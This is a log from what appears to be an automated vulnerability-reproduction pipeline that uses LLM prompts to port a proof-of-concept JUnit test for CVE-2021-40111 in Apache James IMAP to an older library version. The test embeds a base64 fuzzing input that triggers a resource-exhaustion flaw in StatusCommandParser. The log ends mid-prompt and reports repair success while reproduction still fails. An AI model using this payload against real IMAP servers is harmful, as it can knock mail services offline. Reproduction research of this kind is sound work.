[92m[ErrorManager] Processing line: [ERROR]   location: package org.apache.james.imap.decode[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,105] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.StatusCommandParserChild[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,31] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class DecodingException[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 2285 (prompt), 1 (completion), 2286 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,36] cannot find symbol
  symbol:   class DecodingException
  location: package org.apache.james.imap.decode
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,105] cannot find symbol
  symbol:   class DecodingException
  location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,31] cannot find symbol
  symbol:   class DecodingException
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: no arguments
  found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
  reason: actual and formal argument lists differ in length
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
  found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession
  reason: actual and formal argument lists differ in length
[INFO] 5 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.418 s
[INFO] Finished at: 2025-07-13T15:28:49Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,36] cannot find symbol
[ERROR]   symbol:   class DecodingException
[ERROR]   location: package org.apache.james.imap.decode
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,105] cannot find symbol
[ERROR]   symbol:   class DecodingException
[ERROR]   location: class edu.vision.se.StatusCommandParserChild
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,31] cannot find symbol
[ERROR]   symbol:   class DecodingException
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: no arguments
[ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
[ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 141 (prompt), 15 (completion), 156 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: cannot find symbol, class DecodingException, package org.apache.james.imap.decode 

The test executes as expected in 3.5.0 

Error code: import org.apache.james.imap.decode.DecodingException; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.decode.DecodingException;DecodingException
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.decode.DecodingException', 'DecodingException'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 9, 'column': 36, 'message': 'cannot find symbol', 'symbol': 'class DecodingException', 'location': 'package org.apache.james.imap.decode', 'code_line': 'import org.apache.james.imap.decode.DecodingException;'} with cause: ['org.apache.james.imap.decode.DecodingException', 'DecodingException'][0m
[96m[Adapter] Related diffs for error: [(4979, 8.0), (4983, 8.0), (4990, 8.0), (4991, 8.0), (4997, 8.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | class DecodingException cause: ['org.apache.james.imap.decode.DecodingException', 'DecodingException'][0m
[96m[RepairModule] Trying best diff #4979 with score 8.00[0m
[96m[RepairModule] Found 10 diff combinations for annealing.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: Trying diff #4983 with score 8.00[0m
[LLMClient] Tokens used: 905 (prompt), 456 (completion), 1361 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully in 3.5.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.5.0 to 3.4.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: class DecodingException, location: package org.apache.james.imap.decode

### Error Position:
import org.apache.james.imap.decode.DecodingException;

### Related Diff:
Operation: MODIFIED, File: protocols/imap/src/main/java/org/apache/james/imap/decode/main/DefaultImapDecoder.java, Hunk: @@ -18,16 +18,19 @@
  ****************************************************************/
 package org.apache.james.imap.decode.main;

-import java.util.Optional;
-
 import org.apache.james.imap.api.ImapMessage;
 import org.apache.james.imap.api.ImapSessionState;
-import org.apache.james.imap.api.Tag;
 import org.apache.james.imap.api.display.HumanReadableText;
 import org.apache.james.imap.api.message.response.StatusResponseFactory;
 import org.apache.james.imap.api.process.ImapSession;
-import org.apache.james.imap.decode.DecodingException;
 import org.apache.james.imap.decode.ImapCommandParser;
 import org.apache.james.imap.decode.ImapCommandParserFactory;
 import org.apache.james.imap.decode.ImapDecoder;
 import org.apache.james.imap.decode.ImapRequestLineReader;
+import org.apache.james.protocols.imap.DecodingException;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;

### Test File Content:
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.imap.decode.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), "AEA", new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}



[LLMClient] Response: 
Here's the modified version of the test file with the corrected import:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), "AEA", new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length |', 'cannot find symbol | class DecodingException', 'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |'}
[RepairModule] New grouped keys: {'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length |', 'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |'}
[92m[RepairModule] Error cannot find symbol resolved after applying diff.[0m
[92m[RepairModule] Repair success with diff #4983 at iteration 1![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: no arguments[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1827 (prompt), 1 (completion), 1828 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: no arguments
  found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
  reason: actual and formal argument lists differ in length
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
  found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession
  reason: actual and formal argument lists differ in length
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.410 s
[INFO] Finished at: 2025-07-13T15:29:21Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[35,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: no arguments
[ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
[ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 176 (prompt), 27 (completion), 203 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 3.5.0 

Error code:         super(statusResponseFactory); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.decode.parser.StatusCommandParser;org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 35, 'column': 9, 'message': 'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length', 'symbol': None, 'location': None, 'code_line': '        super(statusResponseFactory);'} with cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'][0m
[LLMClient] Tokens used: 220 (prompt), 27 (completion), 247 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

